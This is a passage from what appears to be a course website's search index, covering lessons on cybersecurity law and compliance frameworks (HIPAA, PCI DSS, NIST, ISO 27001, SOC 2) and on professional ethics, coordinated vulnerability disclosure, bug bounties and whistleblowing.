2: $1,000-$50,000 (reasonable cause) - Tier 3: $10,000-$50,000 (willful neglect, corrected) - Tier 4: $50,000+ (willful neglect, not corrected) - Criminal penalties possible","title":"Health Insurance Portability and Accountability Act (HIPAA)"},{"location":"LECTURES/unit8/lesson8-2/#payment-card-industry-data-security-standard-pci-dss","text":"Not a law, but contractually required by card companies 12 requirements: 1. Install and maintain firewall configuration 2. Don't use vendor-supplied defaults 3. Protect stored cardholder data 4. Encrypt transmission of cardholder data 5. Protect systems against malware 6. Develop and maintain secure systems 7. Restrict access to cardholder data 8. Identify and authenticate access 9. Restrict physical access to cardholder data 10. Track and monitor network access 11. Regularly test security systems 12. Maintain information security policy Compliance levels: - Level 1: 6+ million transactions/year (annual onsite audit) - Level 2: 1-6 million transactions/year (annual self-assessment) - Level 3: 20,000-1 million e-commerce (annual self-assessment) - Level 4: <20,000 e-commerce or <1 million (annual self-assessment) Penalties: - Fines from card brands ($5,000-$100,000/month) - Increased transaction fees - Loss of ability to process cards","title":"Payment Card Industry Data Security Standard (PCI DSS)"},{"location":"LECTURES/unit8/lesson8-2/#sector-specific-regulations","text":"","title":"Sector-Specific Regulations"},{"location":"LECTURES/unit8/lesson8-2/#financial-services","text":"Gramm-Leach-Bliley Act (GLBA) - Financial institutions must protect customer information - Privacy notices required - Opt-out for information sharing Sarbanes-Oxley Act (SOX) - Internal controls over financial reporting - IT controls are part of this - Criminal penalties for executives New York Department of Financial Services (NYDFS) Cybersecurity Regulation - Applies to financial institutions in NY - Requires cybersecurity program - Annual certification to superintendent - Incident response plan required","title":"Financial Services"},{"location":"LECTURES/unit8/lesson8-2/#critical-infrastructure","text":"NERC CIP (North American Electric Reliability Corporation Critical Infrastructure Protection) - Standards for electric grid security - Mandatory for utilities - Covers physical and cyber security Transportation Security Administration (TSA) Security Directives - Apply to pipelines, rail, aviation - Cybersecurity requirements - Incident reporting","title":"Critical Infrastructure"},{"location":"LECTURES/unit8/lesson8-2/#international-laws","text":"","title":"International Laws"},{"location":"LECTURES/unit8/lesson8-2/#china-cybersecurity-law","text":"Key provisions: - Data localization (critical data must stay in China) - Network security reviews - Real-name registration - Cooperation with authorities","title":"China Cybersecurity Law"},{"location":"LECTURES/unit8/lesson8-2/#australia-privacy-act","text":"Australian Privacy Principles (APPs) - 13 principles for handling personal information - Covers collection, use, disclosure, security - Notifiable Data Breaches scheme","title":"Australia Privacy Act"},{"location":"LECTURES/unit8/lesson8-2/#brazil-lgpd-lei-geral-de-protecao-de-dados","text":"Similar to GDPR: - Data subject rights - Consent requirements - Security requirements - Breach notification","title":"Brazil LGPD (Lei Geral de Prote\u00e7\u00e3o de Dados)"},{"location":"LECTURES/unit8/lesson8-2/#compliance-frameworks","text":"","title":"Compliance Frameworks"},{"location":"LECTURES/unit8/lesson8-2/#nist-cybersecurity-framework","text":"Five functions: 1. Identify - Asset management, risk assessment 2. Protect - Access control, training, data security 3. Detect - Monitoring, detection processes 4. Respond - Response planning, communications 5. Recover - Recovery planning, improvements Not mandatory but widely adopted - Referenced by regulations - Used for assessments - Industry standard","title":"NIST Cybersecurity Framework"},{"location":"LECTURES/unit8/lesson8-2/#iso-2700127002","text":"ISO 27001: Information Security Management System (ISMS) - Certification available - Requires risk assessment - Continuous improvement ISO 27002: Code of practice - Detailed controls - Implementation guidance 14 control domains: 1. Information security policies 2. Organization of information security 3. Human resource security 4. Asset management 5. Access control 6. Cryptography 7. Physical and environmental security 8. Operations security 9. Communications security 10. System acquisition, development, maintenance 11. Supplier relationships 12. Incident management 13. Business continuity 14. Compliance","title":"ISO 27001/27002"},{"location":"LECTURES/unit8/lesson8-2/#soc-2-system-and-organization-controls","text":"Trust Services Criteria: - Security (required for all) - Availability - Processing integrity - Confidentiality - Privacy Two types: - Type I: Design of controls at point in time - Type II: Operating effectiveness over period (6-12 months) Used for: SaaS vendors, cloud providers, service organizations","title":"SOC 2 (System and Organization Controls)"},{"location":"LECTURES/unit8/lesson8-2/#compliance-in-practice","text":"","title":"Compliance in Practice"},{"location":"LECTURES/unit8/lesson8-2/#risk-assessments","text":"Required by many regulations Steps: 1. Identify assets 2. Identify threats 3. Identify vulnerabilities 4. Determine likelihood 5. Determine impact 6. Calculate risk 7. Prioritize 8. Implement controls 9. Monitor and review","title":"Risk Assessments"},{"location":"LECTURES/unit8/lesson8-2/#policies-and-procedures","text":"Required documents: - Information security policy - Acceptable use policy - Incident response plan - Business continuity plan - Disaster recovery plan - Data retention policy - Vendor management policy - Change management procedures Policy structure: 1. Purpose 2. Scope 3. Definitions 4. Policy statements 5. Responsibilities 6. Enforcement 7. Review and updates","title":"Policies and Procedures"},{"location":"LECTURES/unit8/lesson8-2/#training-and-awareness","text":"Required by most regulations Topics: - Security basics - Phishing awareness - Password security - Data handling - Incident reporting - Compliance requirements Frequency: - Annual training minimum - New hire training - Role-specific training - Ad-hoc training for threats","title":"Training and Awareness"},{"location":"LECTURES/unit8/lesson8-2/#audit-and-assessment","text":"Internal audits: - Regular self-assessments - Verify controls are working - Identify gaps External audits: - Independent verification - Required for some regulations - Provides assurance to stakeholders Penetration testing: - Test security controls - Identify vulnerabilities - Often required annually","title":"Audit and Assessment"},{"location":"LECTURES/unit8/lesson8-2/#incident-response-and-reporting","text":"Notification requirements vary: GDPR: 72 hours to authority HIPAA: 60 days to individuals PCI DSS: Immediately to acquiring bank State breach laws: Varies (typically 30-90 days) What to report: - Nature of breach - Data involved - Number of affected individuals - Remediation steps - Contact information","title":"Incident Response and Reporting"},{"location":"LECTURES/unit8/lesson8-2/#documentation","text":"Critical for compliance: - Policies and procedures - Risk assessments - Training records - Audit logs - Incident reports - Vendor assessments - Business associate agreements - Data processing agreements Retention requirements vary: - HIPAA: 6 years - SOX: 7 years - GDPR: As long as necessary - PCI DSS: 1 year minimum","title":"Documentation"},{"location":"LECTURES/unit8/lesson8-2/#consequences-of-non-compliance","text":"","title":"Consequences of Non-Compliance"},{"location":"LECTURES/unit8/lesson8-2/#regulatory-fines","text":"Can be massive: - British Airways: \u00a320 million (GDPR) - Marriott: \u00a318.4 million (GDPR) - Equifax: $575 million (FTC settlement) - Capital One: $80 million (OCC fine)","title":"Regulatory Fines"},{"location":"LECTURES/unit8/lesson8-2/#lawsuits","text":"Private right of action: - Data breach class actions - Can be costly even if settled - Reputation damage","title":"Lawsuits"},{"location":"LECTURES/unit8/lesson8-2/#business-impact","text":"Beyond fines: - Loss of customers - Reputation damage - Inability to process payments (PCI) - Loss of contracts - Stock price impact - Executive turnover","title":"Business Impact"},{"location":"LECTURES/unit8/lesson8-2/#criminal-charges","text":"Possible for: - Willful violations - Obstruction - False statements - Executives can be personally liable","title":"Criminal Charges"},{"location":"LECTURES/unit8/lesson8-2/#staying-compliant","text":"","title":"Staying Compliant"},{"location":"LECTURES/unit8/lesson8-2/#continuous-monitoring","text":"Don't wait for audits: - Regular vulnerability scans - Log monitoring - Access reviews - Configuration reviews - Vendor assessments","title":"Continuous Monitoring"},{"location":"LECTURES/unit8/lesson8-2/#change-management","text":"Updates can break compliance: - Document changes - Assess impact on security - Test before deploying - Update documentation","title":"Change Management"},{"location":"LECTURES/unit8/lesson8-2/#vendor-management","text":"Third parties are your responsibility: - Due diligence before selection - Contractual requirements - Regular assessments - Incident response coordination - Right to audit","title":"Vendor Management"},{"location":"LECTURES/unit8/lesson8-2/#keep-current","text":"Laws and regulations change: - Subscribe to updates - Attend conferences - Professional associations - Legal counsel - Compliance consultants","title":"Keep Current"},{"location":"LECTURES/unit8/lesson8-2/#practical-compliance-checklist","text":"GDPR Compliance: - [ ] Data inventory completed - [ ] Lawful basis identified for processing - [ ] Privacy notices updated - [ ] Data subject request procedures - [ ] Breach notification procedures - [ ] DPO appointed (if required) - [ ] Data protection impact assessments - [ ] Vendor agreements updated - [ ] Staff training completed - [ ] Technical and organizational measures HIPAA Compliance: - [ ] Risk assessment completed - [ ] Policies and procedures documented - [ ] Business associate agreements - [ ] Encryption implemented - [ ] Access controls - [ ] Audit logging - [ ] Training completed - [ ] Incident response plan - [ ] Breach notification procedures - [ ] Physical security measures PCI DSS Compliance: - [ ] Cardholder data inventory - [ ] Network segmentation - [ ] Firewall configuration - [ ] No default passwords - [ ] Data encryption - [ ] Malware protection - [ ] Secure systems and applications - [ ] Access control - [ ] Unique IDs - [ ] Physical access restrictions - [ ] Logging and monitoring - [ ] Security testing - [ ] Information security policy","title":"Practical Compliance Checklist"},{"location":"LECTURES/unit8/lesson8-2/#key-takeaways","text":"Legal landscape: - Criminal laws punish unauthorized access - Privacy laws protect personal data - Sector regulations add requirements - International laws create complexity - Compliance frameworks provide structure Your responsibilities: - Know the laws that apply - Implement required controls - Document everything - Train users - Monitor continuously - Report incidents properly Compliance is not security: - Meeting minimum requirements \u2260 secure - Security should exceed compliance - But compliance is mandatory baseline Remember: - Ignorance is not a defense - Personal liability is possible - Non-compliance is expensive - Compliance is ongoing, not one-time - Get legal advice when uncertain Understanding legal requirements is essential for security professionals. You need to protect your organization legally as well as technically. This knowledge helps you make informed decisions and avoid costly violations.","title":"Key Takeaways"},{"location":"LECTURES/unit8/lesson8-3/","text":"Professional Ethics and Responsible Disclosure Beyond laws and compliance, cybersecurity professionals face ethical dilemmas daily. This lesson explores real-world ethical challenges, responsible disclosure, and how to navigate gray areas in security work. The Hacker Ethic Revisited Original Hacker Ethic (Steven Levy) Access to computers should be unlimited and total All information should be free Mistrust authority\u2014promote decentralization Hackers should be judged by their hacking, not bogus criteria You can create art and beauty on a computer Computers can change your life for the better Modern Security Professional Ethic Adapted for today's reality: Access should be authorized and purposeful Information should be protected and shared responsibly Work within established systems while advocating for change Skills should serve legitimate purposes Security is both technical art and critical necessity Technology should improve society safely and ethically Ethical Dilemmas in Security Scenario 1: The Vulnerable System Situation: While browsing a company's website, you notice a SQL injection vulnerability. You could access customer data with minimal effort. The company has no security contact or bug bounty program. Options: A. Exploit it to prove it's real, screenshot evidence, report B. Report without exploiting C. Ignore it D. Publicly disclose immediately Ethical analysis: - A is illegal (unauthorized access, even for good intent) - B is correct (responsible, legal) - C is negligent (you have knowledge, failure to act) - D is harmful (gives criminals time to exploit) Best practice: Report through appropriate channels without exploitation Scenario 2: The Insider Threat Situation: During a penetration test, you discover evidence that an employee is stealing customer credit cards. Your engagement scope is network security, not fraud investigation. Considerations: - Scope of engagement (authorized to see this data?) - Chain of custody (evidence admissible?) - Client relationship (who do you tell?) - Legal obligations (mandatory reporting?) - Timing (immediate vs. end of engagement?) Best practice: 1. Document findings carefully 2. Report to engagement sponsor immediately 3. Do not investigate further (outside scope) 4. Preserve evidence properly 5. Follow client's legal counsel direction Scenario 3: The Government Request Situation: Law enforcement requests access to your company's systems to investigate a customer. They have a warrant, but it's overly broad and could compromise other customers' privacy. Considerations: - Legal obligation vs. customer privacy - Warrant validity and scope - Company policy - Precedent setting - Public interest Best practice: - Verify warrant authenticity - Legal counsel review - Narrow scope if possible - Document everything - Transparency (if legally allowed) Scenario 4: The Zero-Day Situation: You discover a critical zero-day in widely-used software. No patch exists. Disclosure could endanger millions. Options: - Immediate public disclosure - Vendor notification with deadline - Sell to broker - Report to government - Keep quiet Best practice: Coordinated disclosure 1. Notify vendor privately 2. Give reasonable time to patch (typically 90 days) 3. Offer assistance 4. Public disclosure after patch or deadline 5. Never sell exploits Responsible Disclosure Full Disclosure Philosophy: Immediate public disclosure Argument: Pressures vendors, informs users quickly Problems: Gives attackers weaponizable information Rarely appropriate - only for: - Vendor unresponsive for extended period - Active exploitation already occurring - Public safety critical and vendor negligent Coordinated Disclosure Process: 1. Discover vulnerability 2. Verify and document (proof of concept) 3. Identify vendor contact (security@, PSIRT) 4. Initial notification (encrypted if possible) 5. Provide details (after acknowledgment) 6. Allow remediation time (30-90 days typical) 7. Coordinate public disclosure (with vendor) 8. Public disclosure (after patch or deadline) Timeline example: Day 0: Discover vulnerability Day 1: Initial vendor notification Day 3: Vendor acknowledges Day 5: Full technical details provided Day 30: Vendor provides patch timeline Day 60: Patch developed Day 75: Patch released Day 90: Public disclosure (if not patched, disclose anyway) Vendor Response Types Good vendor: - Acknowledges quickly - Provides timeline - Communicates regularly - Credits researcher - Releases patch - Thanks publicly Poor vendor: - Ignores reports - Denies vulnerability - Threatens legal action - Misses deadlines - No communication What to do with poor vendor: - Document all communication - Set clear deadline - Escalate (CERT, media) - Disclose after deadline - Protect yourself legally Bug Bounty Programs Platforms: - HackerOne - Bugcrowd - Synack - Intigriti Benefits: - Clear rules of engagement - Legal protection - Financial reward - Recognition Typical payouts: - Low severity: $50-$500 - Medium severity: $500-$2,500 - High severity: $2,500-$10,000 - Critical severity: $10,000-$50,000+ Hall of fame examples: - Google: Paid $12+ million in bounties - Microsoft: Over $13 million since 2013 - Facebook: $40,000 for single bug Responsible Disclosure Template Email subject: Security Vulnerability Report - [Brief Description] Email body: Hello [Company] Security Team, I am a security researcher and have discovered a security vulnerability in [Product/Service]. I am reporting this to you in good faith to help improve your security. Vulnerability Summary: - Type: [SQL Injection, XSS, etc.] - Severity: [Critical/High/Medium/Low] - Affected: [URL, product, version] I have prepared a detailed technical report and proof of concept. I am happy to provide these details once we establish secure communication. Please acknowledge receipt of this email. I plan to publicly disclose this vulnerability 90 days from today, or sooner if a patch is released. I am available to assist with remediation and can be reached at: [Contact information] Thank you for your attention to this matter. Best regards, [Your name] Working with Sensitive Data Handling Customer Data Principles: - Need to know - only access what's required - Least privilege - minimum permissions necessary - Audit trail - log all access - Data minimization - use test data when possible - Secure destruction - properly delete when done During penetration testing: - Don't exfiltrate real data - Don't view unnecessary data - Screenshot only what's needed - Blur sensitive information - Secure all evidence Protecting Trade Secrets During security work: - Sign NDAs appropriately - Secure your systems - Encrypt communications - Don't discuss publicly - Separate client data After engagement: - Return/destroy all data - Remove from personal systems - Don't reuse techniques that reveal client info - Don't use as portfolio without permission Conflicts of Interest Multiple Clients Scenario: You work for Company A and Company B, who are competitors. Issues: - Knowledge from A could benefit B - Techniques developed for A used for B - Appearance of impropriety Best practices: - Disclose potential conflicts - Get written consent - Information barriers - Document everything - When in doubt, decline Employment and Consulting Moonlighting: - Check employment agreement - Ensure no conflict with employer - Don't use employer resources - Don't compete directly Former employers: - Respect confidentiality agreements - Don't use proprietary information - Don't solicit former clients (if restricted) - Clean separation Social Responsibility Critical Infrastructure Extra care required for: - Power grids - Water systems - Healthcare - Transportation - Financial systems Considerations: - Lives may depend on availability - Nation-state actors target these - Disclosure timing more critical - Coordinate with authorities Example: Stuxnet targeting Iranian nuclear facilities raised questions about cyber weapons ethics Dual-Use Technology Security tools can be misused: - Port scanners - Exploit frameworks - Password crackers - Network interceptors Responsibility: - Don't enable criminals - Consider misuse potential - Implement safeguards where possible - Educate users Surveillance Technology Ethical questions: - Employee monitoring - how much is too much? - Government surveillance - where's the line? - Selling to oppressive regimes - should you? Personal stance required: - Know your boundaries - Some work you may refuse - Document concerns - Whistleblowing as last resort Whistleblowing When to Blow the Whistle Indicators: - Illegal activity - Serious safety threat - Major regulatory violation - Cover-up of wrongdoing - All internal channels exhausted NOT appropriate for: - Minor policy violations - Personal disputes - Speculation - Revenge How to Whistleblow Internal channels first: 1. Supervisor 2. Management 3. Compliance office 4. Legal department 5. Board of directors External channels: - Regulatory agencies - Law enforcement - Media (last resort) Protections: - Sarbanes-Oxley (SOX) - Dodd-Frank - Whistleblower Protection Act - Varies by jurisdiction Risks: - Retaliation (despite protections) - Career impact - Legal costs - Stress - Loss of employment If you must: - Document everything - Legal counsel - Secure communications - Anonymous if possible - Protect yourself Building an Ethical Culture As an Individual Daily practices: - Question assumptions - Seek diverse perspectives - Admit mistakes - Learn from failures - Mentor others - Share knowledge responsibly Red flags to notice: - Pressure to cut corners - Normalizing unethical behavior - Lack of oversight - Retaliation for raising concerns As a Leader Set the tone: - Model ethical behavior - Reward ethical choices - Create safe reporting channels - Address violations consistently - Invest in training - Celebrate ethical wins Policies to implement: - Code of ethics - Whistleblower protection - Conflict of interest disclosure - Responsible disclosure policy - Security research policy As an Organization Structure: - Ethics officer/committee - Anonymous reporting hotline - Regular training - Ethical decision-making framework - Incident review process Culture: - Psychological safety - Speak-up culture - Diversity of thought - Continuous improvement - Accountability at all levels Ethical Decision-Making Framework When facing ethical dilemma: 1. Identify the issue - What is the ethical question? - Who are the stakeholders? - What are the facts? 2. Consider alternatives - What are all possible actions? - What are consequences of each? - Are there creative solutions? 3. Evaluate against principles - Is it legal? - Is it fair? - How would I feel if it were public? - Does it align with professional standards? - Would I want this done to me? 4. Make a decision - Choose the most ethical option - Document reasoning - Be prepared to explain 5. Implement and reflect - Take action - Monitor outcomes - Learn from experience - Adjust if needed Real-World Examples Case Study: Project Zero Google's approach: - 90-day disclosure deadline - Extensions only if patch nearly ready - Public disclosure regardless of patch status - Highly controversial but consistent Outcomes: - Faster patches overall - Some vendor anger - Industry debate on timelines - Generally improved security Case Study: Marcus Hutchins Background: - Stopped WannaCry ransomware - Hailed as hero - Arrested for old malware development - Community divided Lessons: - Past actions have consequences - Redemption is possible but complex - Legal jeopardy for security researchers - Grey area between research and crime Case Study: Researcher vs. Company Common pattern: 1. Researcher finds bug 2. Reports to company 3. Company threatens legal action 4. Researcher backs down or fights 5. Public backlash against company 6. Company reverses course (usually) Examples: - Nissan threatening researcher - Avast threatening security journalist - Ring threatening researchers Result: Safe harbor provisions becoming more common Key Takeaways Professional ethics require: - Going beyond legal compliance - Considering broader impact - Protecting all stakeholders - Transparent decision-making - Continuous ethical reflection Responsible disclosure: - Notify vendor privately - Reasonable timeline (90 days) - Coordinate public disclosure - Never sell exploits to bad actors - Protect users first Handling dilemmas: - Use decision-making framework - Seek guidance when uncertain - Document reasoning - Err on side of caution - Learn from others' experiences Remember: - Your reputation is your career - Ethics matter more than legal minimum - Short-term gains vs. long-term trust - When in doubt, ask - Do the right thing even when hard Cybersecurity is not just technical\u2014it's deeply human. Your ethical choices shape the industry, protect users, and define what kind of professional you'll be. Choose wisely.","title":"Lesson 8.3"},{"location":"LECTURES/unit8/lesson8-3/#professional-ethics-and-responsible-disclosure","text":"Beyond laws and compliance, cybersecurity professionals face ethical dilemmas daily. This lesson explores real-world ethical challenges, responsible disclosure, and how to navigate gray areas in security work.","title":"Professional Ethics and Responsible Disclosure"},{"location":"LECTURES/unit8/lesson8-3/#the-hacker-ethic-revisited","text":"","title":"The Hacker Ethic Revisited"},{"location":"LECTURES/unit8/lesson8-3/#original-hacker-ethic-steven-levy","text":"Access to computers should be unlimited and total All information should be free Mistrust authority\u2014promote decentralization Hackers should be judged by their hacking, not bogus criteria You can create art and beauty on a computer Computers can change your life for the better","title":"Original Hacker Ethic (Steven Levy)"},{"location":"LECTURES/unit8/lesson8-3/#modern-security-professional-ethic","text":"Adapted for today's reality: Access should be authorized and purposeful Information should be protected and shared responsibly Work within established systems while advocating for change Skills should serve legitimate purposes Security is both technical art and critical necessity Technology should improve society safely and ethically","title":"Modern Security Professional Ethic"},{"location":"LECTURES/unit8/lesson8-3/#ethical-dilemmas-in-security","text":"","title":"Ethical Dilemmas in Security"},{"location":"LECTURES/unit8/lesson8-3/#scenario-1-the-vulnerable-system","text":"Situation: While browsing a company's website, you notice a SQL injection vulnerability. You could access customer data with minimal effort. The company has no security contact or bug bounty program. Options: A. Exploit it to prove it's real, screenshot evidence, report B. Report without exploiting C. Ignore it D. Publicly disclose immediately Ethical analysis: - A is illegal (unauthorized access, even for good intent) - B is correct (responsible, legal) - C is negligent (you have knowledge, failure to act) - D is harmful (gives criminals time to exploit) Best practice: Report through appropriate channels without exploitation","title":"Scenario 1: The Vulnerable System"},{"location":"LECTURES/unit8/lesson8-3/#scenario-2-the-insider-threat","text":"Situation: During a penetration test, you discover evidence that an employee is stealing customer credit cards. Your engagement scope is network security, not fraud investigation. Considerations: - Scope of engagement (authorized to see this data?) - Chain of custody (evidence admissible?) - Client relationship (who do you tell?) - Legal obligations (mandatory reporting?) - Timing (immediate vs. end of engagement?) Best practice: 1. Document findings carefully 2. Report to engagement sponsor immediately 3. Do not investigate further (outside scope) 4. Preserve evidence properly 5. Follow client's legal counsel direction","title":"Scenario 2: The Insider Threat"},{"location":"LECTURES/unit8/lesson8-3/#scenario-3-the-government-request","text":"Situation: Law enforcement requests access to your company's systems to investigate a customer. They have a warrant, but it's overly broad and could compromise other customers' privacy. Considerations: - Legal obligation vs. customer privacy - Warrant validity and scope - Company policy - Precedent setting - Public interest Best practice: - Verify warrant authenticity - Legal counsel review - Narrow scope if possible - Document everything - Transparency (if legally allowed)","title":"Scenario 3: The Government Request"},{"location":"LECTURES/unit8/lesson8-3/#scenario-4-the-zero-day","text":"Situation: You discover a critical zero-day in widely-used software. No patch exists. Disclosure could endanger millions. Options: - Immediate public disclosure - Vendor notification with deadline - Sell to broker - Report to government - Keep quiet Best practice: Coordinated disclosure 1. Notify vendor privately 2. Give reasonable time to patch (typically 90 days) 3. Offer assistance 4. Public disclosure after patch or deadline 5. Never sell exploits","title":"Scenario 4: The Zero-Day"},{"location":"LECTURES/unit8/lesson8-3/#responsible-disclosure","text":"","title":"Responsible Disclosure"},{"location":"LECTURES/unit8/lesson8-3/#full-disclosure","text":"Philosophy: Immediate public disclosure Argument: Pressures vendors, informs users quickly Problems: Gives attackers weaponizable information Rarely appropriate - only for: - Vendor unresponsive for extended period - Active exploitation already occurring - Public safety critical and vendor negligent","title":"Full Disclosure"},{"location":"LECTURES/unit8/lesson8-3/#coordinated-disclosure","text":"Process: 1. Discover vulnerability 2. Verify and document (proof of concept) 3. Identify vendor contact (security@, PSIRT) 4. Initial notification (encrypted if possible) 5. Provide details (after acknowledgment) 6. Allow remediation time (30-90 days typical) 7. Coordinate public disclosure (with vendor) 8. Public disclosure (after patch or deadline) Timeline example: Day 0: Discover vulnerability Day 1: Initial vendor notification Day 3: Vendor acknowledges Day 5: Full technical details provided Day 30: Vendor provides patch timeline Day 60: Patch developed Day 75: Patch released Day 90: Public disclosure (if not patched, disclose anyway)","title":"Coordinated Disclosure"},{"location":"LECTURES/unit8/lesson8-3/#vendor-response-types","text":"Good vendor: - Acknowledges quickly - Provides timeline - Communicates regularly - Credits researcher - Releases patch - Thanks publicly Poor vendor: - Ignores reports - Denies vulnerability - Threatens legal action - Misses deadlines - No communication What to do with poor vendor: - Document all communication - Set clear deadline - Escalate (CERT, media) - Disclose after deadline - Protect yourself legally","title":"Vendor Response Types"},{"location":"LECTURES/unit8/lesson8-3/#bug-bounty-programs","text":"Platforms: - HackerOne - Bugcrowd - Synack - Intigriti Benefits: - Clear rules of engagement - Legal protection - Financial reward - Recognition Typical payouts: - Low severity: $50-$500 - Medium severity: $500-$2,500 - High severity: $2,500-$10,000 - Critical severity: $10,000-$50,000+ Hall of fame examples: - Google: Paid $12+ million in bounties - Microsoft: Over $13 million since 2013 - Facebook: $40,000 for single bug","title":"Bug Bounty Programs"},{"location":"LECTURES/unit8/lesson8-3/#responsible-disclosure-template","text":"Email subject: Security Vulnerability Report - [Brief Description] Email body: Hello [Company] Security Team, I am a security researcher and have discovered a security vulnerability in [Product/Service]. I am reporting this to you in good faith to help improve your security. Vulnerability Summary: - Type: [SQL Injection, XSS, etc.] - Severity: [Critical/High/Medium/Low] - Affected: [URL, product, version] I have prepared a detailed technical report and proof of concept. I am happy to provide these details once we establish secure communication. Please acknowledge receipt of this email. I plan to publicly disclose this vulnerability 90 days from today, or sooner if a patch is released. I am available to assist with remediation and can be reached at: [Contact information] Thank you for your attention to this matter. Best regards, [Your name]","title":"Responsible Disclosure Template"},{"location":"LECTURES/unit8/lesson8-3/#working-with-sensitive-data","text":"","title":"Working with Sensitive Data"},{"location":"LECTURES/unit8/lesson8-3/#handling-customer-data","text":"Principles: - Need to know - only access what's required - Least privilege - minimum permissions necessary - Audit trail - log all access - Data minimization - use test data when possible - Secure destruction - properly delete when done During penetration testing: - Don't exfiltrate real data - Don't view unnecessary data - Screenshot only what's needed - Blur sensitive information - Secure all evidence","title":"Handling Customer Data"},{"location":"LECTURES/unit8/lesson8-3/#protecting-trade-secrets","text":"During security work: - Sign NDAs appropriately - Secure your systems - Encrypt communications - Don't discuss publicly - Separate client data After engagement: - Return/destroy all data - Remove from personal systems - Don't reuse techniques that reveal client info - Don't use as portfolio without permission","title":"Protecting Trade Secrets"},{"location":"LECTURES/unit8/lesson8-3/#conflicts-of-interest","text":"","title":"Conflicts of Interest"},{"location":"LECTURES/unit8/lesson8-3/#multiple-clients","text":"Scenario: You work for Company A and Company B, who are competitors. Issues: - Knowledge from A could benefit B - Techniques developed for A used for B - Appearance of impropriety Best practices: - Disclose potential conflicts - Get written consent - Information barriers - Document everything - When in doubt, decline","title":"Multiple Clients"},{"location":"LECTURES/unit8/lesson8-3/#employment-and-consulting","text":"Moonlighting: - Check employment agreement - Ensure no conflict with employer - Don't use employer resources - Don't compete directly Former employers: - Respect confidentiality agreements - Don't use proprietary information - Don't solicit former clients (if restricted) - Clean separation","title":"Employment and Consulting"},{"location":"LECTURES/unit8/lesson8-3/#social-responsibility","text":"","title":"Social Responsibility"},{"location":"LECTURES/unit8/lesson8-3/#critical-infrastructure","text":"Extra care required for: - Power grids - Water systems - Healthcare - Transportation - Financial systems Considerations: - Lives may depend on availability - Nation-state actors target these - Disclosure timing more critical - Coordinate with authorities Example: Stuxnet targeting Iranian nuclear facilities raised questions about cyber weapons ethics","title":"Critical Infrastructure"},{"location":"LECTURES/unit8/lesson8-3/#dual-use-technology","text":"Security tools can be misused: - Port scanners - Exploit frameworks - Password crackers - Network interceptors Responsibility: - Don't enable criminals - Consider misuse potential - Implement safeguards where possible - Educate users","title":"Dual-Use Technology"},{"location":"LECTURES/unit8/lesson8-3/#surveillance-technology","text":"Ethical questions: - Employee monitoring - how much is too much? - Government surveillance - where's the line? - Selling to oppressive regimes - should you? Personal stance required: - Know your boundaries - Some work you may refuse - Document concerns - Whistleblowing as last resort","title":"Surveillance Technology"},{"location":"LECTURES/unit8/lesson8-3/#whistleblowing","text":"","title":"Whistleblowing"},{"location":"LECTURES/unit8/lesson8-3/#when-to-blow-the-whistle","text":"Indicators: - Illegal activity - Serious safety threat - Major regulatory violation - Cover-up of wrongdoing - All internal channels exhausted NOT appropriate for: - Minor policy violations - Personal disputes - Speculation - Revenge","title":"When to Blow the Whistle"},{"location":"LECTURES/unit8/lesson8-3/#how-to-whistleblow","text":"Internal channels first: 1. Supervisor 2. Management 3. Compliance office 4. Legal department 5. Board of directors External channels: - Regulatory agencies - Law enforcement - Media (last resort) Protections: - Sarbanes-Oxley (SOX) - Dodd-Frank - Whistleblower Protection Act - Varies by jurisdiction Risks: - Retaliation (despite protections) - Career impact - Legal costs - Stress - Loss of employment If you must: - Document everything - Legal counsel - Secure communications - Anonymous if possible - Protect yourself","title":"How to Whistleblow"},{"location":"LECTURES/unit8/lesson8-3/#building-an-ethical-culture","text":"","title":"Building an Ethical Culture"},{"location":"LECTURES/unit8/lesson8-3/#as-an-individual","text":"Daily practices: - Question assumptions - Seek diverse perspectives - Admit mistakes - Learn from failures - Mentor others - Share knowledge responsibly Red flags to notice: - Pressure to cut corners - Normalizing unethical behavior - Lack of oversight - Retaliation for raising concerns","title":"As an Individual"},{"location":"LECTURES/unit8/lesson8-3/#as-a-leader","text":"Set the tone: - Model ethical behavior - Reward ethical choices - Create safe reporting channels - Address violations consistently - Invest in training - Celebrate ethical wins Policies to implement: - Code of ethics - Whistleblower protection - Conflict of interest disclosure - Responsible disclosure policy - Security research policy","title":"As a Leader"},{"location":"LECTURES/unit8/lesson8-3/#as-an-organization","text":"Structure: - Ethics officer/committee - Anonymous reporting hotline - Regular training - Ethical decision-making framework - Incident review process Culture: - Psychological safety - Speak-up culture - Diversity of thought - Continuous improvement - Accountability at all levels","title":"As an Organization"},{"location":"LECTURES/unit8/lesson8-3/#ethical-decision-making-framework","text":"When facing ethical dilemma: 1. Identify the issue - What is the ethical question? - Who are the stakeholders? - What are the facts? 2. Consider alternatives - What are all possible actions? - What are consequences of each? - Are there creative solutions? 3. Evaluate against principles - Is it legal? - Is it fair? - How would I feel if it were public? - Does it align with professional standards? - Would I want this done to me? 4. Make a decision - Choose the most ethical option - Document reasoning - Be prepared to explain 5. Implement and reflect - Take action - Monitor outcomes - Learn from experience - Adjust if needed","title":"Ethical Decision-Making Framework"},{"location":"LECTURES/unit8/lesson8-3/#real-world-examples","text":"","title":"Real-World Examples"},{"location":"LECTURES/unit8/lesson8-3/#case-study-project-zero","text":"Google's approach: - 90-day disclosure deadline - Extensions only if patch nearly ready - Public disclosure regardless of patch status - Highly controversial but consistent Outcomes: - Faster patches overall - Some vendor anger - Industry debate on timelines - Generally improved security","title":"Case Study: Project Zero"},{"location":"LECTURES/unit8/lesson8-3/#case-study-marcus-hutchins","text":"Background: - Stopped WannaCry ransomware - Hailed as hero - Arrested for old malware development - Community divided Lessons: - Past actions have consequences - Redemption is possible but complex - Legal jeopardy for security researchers - Grey area between research and crime","title":"Case Study: Marcus Hutchins"},{"location":"LECTURES/unit8/lesson8-3/#case-study-researcher-vs-company","text":"Common pattern: 1. Researcher finds bug 2. Reports to company 3. Company threatens legal action 4. Researcher backs down or fights 5. Public backlash against company 6. Company reverses course (usually) Examples: - Nissan threatening researcher - Avast threatening security journalist - Ring threatening researchers Result: Safe harbor provisions becoming more common","title":"Case Study: Researcher vs. Company"},{"location":"LECTURES/unit8/lesson8-3/#key-takeaways","text":"Professional ethics require: - Going beyond legal compliance - Considering broader impact - Protecting all stakeholders - Transparent decision-making - Continuous ethical reflection Responsible disclosure: - Notify vendor privately - Reasonable timeline (90 days) - Coordinate public disclosure - Never sell exploits to bad actors - Protect users first Handling dilemmas: - Use decision-making framework - Seek guidance when uncertain - Document reasoning - Err on side of caution - Learn from others' experiences Remember: - Your reputation 